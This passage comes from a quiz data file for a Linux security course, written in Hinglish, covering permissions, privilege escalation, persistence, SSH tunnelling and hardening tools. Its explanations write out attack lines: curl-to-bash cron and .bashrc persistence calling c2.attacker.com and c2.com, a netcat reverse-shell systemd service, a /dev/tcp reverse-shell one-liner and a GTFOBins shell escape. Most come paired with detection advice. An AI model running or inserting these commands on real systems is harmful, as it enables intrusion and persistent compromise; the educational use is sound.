    { question: "chmod 755 kya permissions set karta hai?", options: ["Sirf owner ko sab permissions", "Owner = rwx (7), Group = r-x (5), Others = r-x (5) — scripts ke liye standard", "Sab ko sab permissions", "Koi permissions nahi"], correctIndex: 1, explanation: "chmod numeric: r=4, w=2, x=1. 755 = owner(4+2+1=7=rwx), group(4+0+1=5=r-x), others(4+0+1=5=r-x). Scripts/executables ke liye standard. Config files: 640 (owner rw, group r). Private keys: 600 (sirf owner rw). 777 = security risk!" },
    { question: "GTFOBins kya hai?", options: ["Linux vulnerabilities database", "SUID/sudo binaries ki list jo shell spawn kar sakti hain ya files read/write kar sakti hain — privilege escalation ke liye", "Git hosting platform", "Network scanning tool"], correctIndex: 1, explanation: "GTFOBins (gtfobins.github.io): Unix binaries ki curated list jo misconfigured systems mein privilege escalation, restricted shells escape, file read/write ke liye abuse ho sakti hain. Jaise: sudo find / -exec /bin/sh \\; ya vim pe :!/bin/bash. Pentest mein zaroori reference." },
    { question: "sudo -l command kya show karta hai?", options: ["Logged in users", "Current user kya sudo commands bina password ke ya specific commands run kar sakta hai", "System logs", "Network interfaces"], correctIndex: 1, explanation: "sudo -l = current user ke sudo privileges. Output: '(ALL) NOPASSWD: /bin/vim' matlab root ke roop mein vim bina password ke. GTFOBins + sudo -l = privilege escalation check. (ALL) ALL = root se kuch bhi. Pentest mein sabse pehle yeh check karo." },
    { question: "Linux capabilities kya hain aur kyun important hain?", options: ["CPU processing units", "Root privileges ko granular permissions mein torna — jaise CAP_NET_RAW (raw sockets) bina full root ke", "Memory allocation", "Network speed settings"], correctIndex: 1, explanation: "Linux capabilities: instead of 'all or nothing root', specific privileges assign karo. CAP_NET_RAW = raw sockets (nmap), CAP_NET_BIND_SERVICE = bind to ports < 1024, CAP_SYS_PTRACE = process tracing. getcap -r / 2>/dev/null — capabilities wali files dhundo. Privilege escalation vector bhi hai." },
    { question: "AppArmor aur SELinux ka kya kaam hai?", options: ["Network firewall hai", "Mandatory Access Control — programs ko sirf allowed resources access karne deta hai, even root hone ke baad bhi", "Antivirus hai", "Password manager hai"], correctIndex: 1, explanation: "MAC (Mandatory Access Control): OS-level policy jisme programs sirf defined resources access kar sakte hain. AppArmor (Ubuntu) = path-based, profiles easily readable. SELinux (RHEL/CentOS) = label-based, granular lekin complex. Rootkit bhi restricted ho jaata hai — kernel-level access mili bhi toh MAC bypass karna padega." },
  ],

  "os-04": [
    { question: "LD_PRELOAD hijacking kaise kaam karta hai?", options: ["Library update karna", "Environment variable LD_PRELOAD se malicious shared library hamesha pehle load hoti hai — functions override ho jaate hain", "Library delete karna", "Library encrypt karna"], correctIndex: 1, explanation: "LD_PRELOAD = shared library jo dynamically-linked program se pehle load hoti hai. Attacker malicious .so file banata hai jo standard functions (getuid, getpwnam) override karta hai. Agar SUID binary LD_PRELOAD respect kare (shouldn't but sometimes does) = privilege escalation. sudo -l mein LD_PRELOAD = common exploit path." },
    { question: "Malware Linux mein persistence kaise banata hai crontab se?", options: ["Registry mein entry daalta hai", "/etc/crontab ya cron.d mein entry daalta hai jo time pe malicious command run kare", "Desktop shortcut banata hai", "Service mein entry daalta hai sirf"], correctIndex: 1, explanation: "Cron persistence: */5 * * * * root curl http://c2.attacker.com/payload | bash (har 5 min). Common locations: /etc/crontab, /var/spool/cron/crontabs/root, /etc/cron.d/. Hunting: crontab -l, find /etc/cron* -type f, cat /etc/crontab. Defenders: cron logs check karo (/var/log/cron)." },
    { question: "~/.bashrc mein persistence kaise set hoti hai?", options: ["Bashrc mein passwords store hote hain", "Jab bhi bash shell khule, bashrc mein commands execute hoti hain — attacker malicious command daal sakta hai", "Bashrc network settings hain", "Bashrc sirf display settings hai"], correctIndex: 1, explanation: "~/.bashrc bash interactive shell pe execute hota hai. Attacker: echo 'curl http://c2.com/beacon | bash' >> ~/.bashrc. Jab bhi user terminal khole, beacon chalega. Detection: cat ~/.bashrc, ~/.bash_profile, ~/.profile. Also check: /etc/profile, /etc/bash.bashrc — system-wide persistence." },
    { question: "Systemd service persistence kaise kaam karta hai?", options: ["Service auto delete hoti hai", "Attacker .service file /etc/systemd/system/ mein daalta hai — ExecStart mein malicious command — system reboot pe auto start", "Service sirf manually start hoti hai", "Service network dependent hai"], correctIndex: 1, explanation: "Systemd service persistence: /etc/systemd/system/backdoor.service mein: [Service] ExecStart=/bin/bash -c 'nc -e /bin/bash attacker_ip 4444' [Install] WantedBy=multi-user.target. Phir: systemctl enable backdoor. Reboot pe auto start. Detection: systemctl list-units --all, find /etc/systemd -name '*.service'." },
    { question: "nohup command kya karta hai?", options: ["Network hang karta hai", "Process ko HUP signal se immune karta hai — terminal close hone ke baad bhi process chalta rehta hai", "No operation perform karta hai", "Network hop karta hai"], correctIndex: 1, explanation: "nohup command & — terminal close hone pe SIGHUP signal send hota hai jo processes terminate karta hai. nohup se process immune ho jaata hai. Output nohup.out mein. Attackers: nohup malware & — SSH session close karo, malware chalta rahe. Detection: ps aux | grep nohup, pstree command." },
  ],

  "os-05": [
    { question: "Bash mein '$()' ka kya use hai?", options: ["Variable declare karna", "Command substitution — command ka output variable ya doosri command mein use karna: ports=$(nmap -oG - target | grep 'open')", "Comment likhna", "Array create karna"], correctIndex: 1, explanation: "Command substitution $(): result = $(command). Jaise: timestamp=$(date +%Y%m%d), output=$(cat file.txt | grep password). Backtick `` bhi kaam karta hai lekin $() better hai (nesting support). Scripting mein: dynamic values, command output capture karna." },
    { question: "Bash mein 'set -e' kya karta hai?", options: ["Environment variables set karna", "Script exit kara deta hai jab bhi koi command fail ho — unhandled errors prevent karta hai", "All variables export karna", "Shell mode change karna"], correctIndex: 1, explanation: "set -e = exit on error. Koi bhi command non-zero exit code return kare toh script immediately exit ho jaata hai. Secure scripts mein helpful — agar curl fail ho, toh malicious payload install mat karo. set -x = debug mode (sab commands print with +). set -o pipefail = pipeline failures bhi catch karo." },
    { question: "Netcat reverse shell ek-liner kaunsa hai bash mein?", options: ["bash -i | nc attacker 4444", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1", "nc attacker 4444 -bash", "bash --connect attacker:4444"], correctIndex: 1, explanation: "bash -i >& /dev/tcp/IP/PORT 0>&1 — stdin, stdout, stderr sab attacker ke nc listener pe jaate hain. -i = interactive bash. /dev/tcp built-in bash pseudo device hai. Ye pure bash hai — nc ki zaroorat nahi! Attacker pe: nc -lvp 4444." },
    { question: "Bash script mein '$1' aur '$@' ka kya matlab hai?", options: ["Random variable", "$1 = pehla argument, $@ = sab arguments — script ko di gayi values access karna", "$1 = PID, $@ = all processes", "$1 = line 1, $@ = all lines"], correctIndex: 1, explanation: "Bash positional parameters: $1 = first arg, $2 = second, $# = total count, $@ = all args (each quoted separately), $* = all args (one string), $0 = script name, $? = last command exit code, $$ = current PID. Example: ./scan.sh 192.168.1.0/24 — $1 = '192.168.1.0/24'." },
    { question: "Bash mein 'while read line; do..done < file.txt' kya karta hai?", options: ["File create karta hai", "File ki har line ko loop mein read karta hai — wordlists process karne ke liye common pattern", "File delete karta hai", "File mein write karta hai"], correctIndex: 1, explanation: "While read loop: file.txt ki har line ko line variable mein daalta hai, loop body execute karta hai. DNS brute force: while read sub; do host $sub.example.com 2>/dev/null | grep 'has address'; done < subdomains.txt. Parallel karo: & add karo loop body ke baad — sab background mein chalein." },
  ],

  "os-06": [
    { question: "SSH Local Port Forwarding (-L) kya karta hai?", options: ["Remote server ka port close karta hai", "Local port se SSH tunnel ke through remote host ka port access — firewall bypass ke liye", "SSH speed badhata hai", "SSH log karta hai"], correctIndex: 1, explanation: "ssh -L 8080:internal_server:80 user@bastion — local machine ka port 8080 → SSH tunnel → bastion → internal_server:80. Browser mein localhost:8080 open karo = internal server access. Firewalled services access karne ke liye. Pentest mein pivoting ke liye essential." },
    { question: "SSH Dynamic SOCKS Proxy (-D) se kya ho sakta hai?", options: ["SSH password disable karna", "Browser traffic SSH tunnel se route karna — poori network SOCKS proxy ban jaati hai tunnel ke zariye", "SSH server banana", "SSH log disable karna"], correctIndex: 1, explanation: "ssh -D 1080 user@server — SOCKS5 proxy localhost:1080 pe create hoti hai. Browser/proxychains configure karo. Sab traffic SSH tunnel se jaata hai. Different IP = censorship/filtering bypass, target network access. proxychains nmap -sT target bhi kaam karta hai." },
    { question: "SSH key-based authentication password se better kyun hai?", options: ["SSH keys longer passwords hain sirf", "Private key = 2048/4096 bit — brute force practically impossible. Password phishing/keylogging se compromise ho sakta hai. Key physical theft chahiye", "SSH keys free hain", "SSH keys automatic renew hote hain"], correctIndex: 1, explanation: "RSA 4096-bit key = 2^4096 combinations — quantum computers bhi aaj nahi crack kar sakte. Phishing attack mein user password de sakta hai lekin private key dena mushkil. Keys pe passphrase add karo extra layer ke liye. Server pe PasswordAuthentication no set karo — brute force attacks automatically fail." },
    { question: "iptables mein inbound SSH allow karne ka rule kya hai?", options: ["iptables -A INPUT -p tcp --dport 22 -j DROP", "iptables -A INPUT -p tcp --dport 22 -j ACCEPT", "iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT", "iptables -D INPUT -p tcp -j ACCEPT"], correctIndex: 1, explanation: "iptables -A INPUT -p tcp --dport 22 -j ACCEPT: A=append, INPUT chain (incoming), p=protocol tcp, dport=destination port 22, j=jump to ACCEPT. Order matters in iptables — first matching rule wins. Hamesha default DROP ke saath kaam karo aur specifically allow karo." },
    { question: "SSH config file (~/.ssh/config) mein kya store kiya ja sakta hai?", options: ["SSH passwords", "Host aliases, ports, keys, ProxyJump config — complex SSH commands short karne ke liye", "SSH logs", "Server IP list"], correctIndex: 1, explanation: "~/.ssh/config: Host jump-server HostName 10.0.0.1 User admin IdentityFile ~/.ssh/jump_key. Phir: ssh jump-server. ProxyJump: ssh -J jump-server internal-target — bina manual tunneling ke. Multiple hosts ke liye aliases, automatically correct key use karo." },
  ],

  "os-07": [
    { question: "Lynis tool kya karta hai?", options: ["Log files generate karta hai", "Automated Linux security audit — CIS benchmarks ke against system check karta hai, vulnerabilities aur misconfigurations report karta hai", "Network scan karta hai", "Malware remove karta hai"], correctIndex: 1, explanation: "lynis audit system — 200+ security checks: weak passwords, SUID files, open ports, unpatched software, SSH config, file permissions. Score deta hai. Remediations suggest karta hai. Incident response aur baseline security ke liye. Agentless, no installation required — lynis download karo run karo." },
    { question: "Fail2ban kya karta hai?", options: ["Failed logins alert bhejta hai sirf", "Log files monitor karta hai, failed login attempts detect karta hai aur offending IPs ko temporarily ban karta hai iptables se", "Firewall hai", "Antivirus hai"], correctIndex: 1, explanation: "Fail2ban: /var/log/auth.log monitor karta hai. 5 failed SSH logins? IP ban karo 10 min. Config: /etc/fail2ban/jail.local — maxretry, bantime, findtime customize karo. SSHd, Apache, Nginx, WordPress — sab ke liye jails available. Brute force attacks practically stop ho jaate hain." },
    { question: "rkhunter kya detect karta hai?", options: ["Rootkits aur malware signatures, hidden files, suspicious processes — system compromise indicators", "Network vulnerabilities", "Password weaknesses", "Disk errors"], correctIndex: 0, explanation: "rkhunter (Rootkit Hunter) = known rootkits, backdoors, local exploits check karta hai. System binaries ko known-good hashes se compare karta hai. /dev mein hidden files, SUID files, suspicious strings in binaries. Regular scans schedule karo cron se. First run: rkhunter --propupd (baseline banao)." },
    { question: "auditd (Linux Audit Framework) kya track karta hai?", options: ["Network traffic sirf", "System calls, file access, user commands — who did what, when, from where — compliance ke liye", "CPU usage sirf", "Memory usage"], correctIndex: 1, explanation: "auditd kernel-level events log karta hai: file opens, permission changes, sudo usage, network connections, process creation. Rules: auditctl -w /etc/passwd -p wa -k passwd_changes. ausearch -k passwd_changes — events dhundo. PCI-DSS, HIPAA compliance ke liye required. Forensics mein post-incident timeline banana." },
    { question: "Kernel hardening ke liye sysctl mein kaunsa setting network protection ke liye important hai?", options: ["net.ipv4.ip_forward = 1", "net.ipv4.conf.all.rp_filter = 1 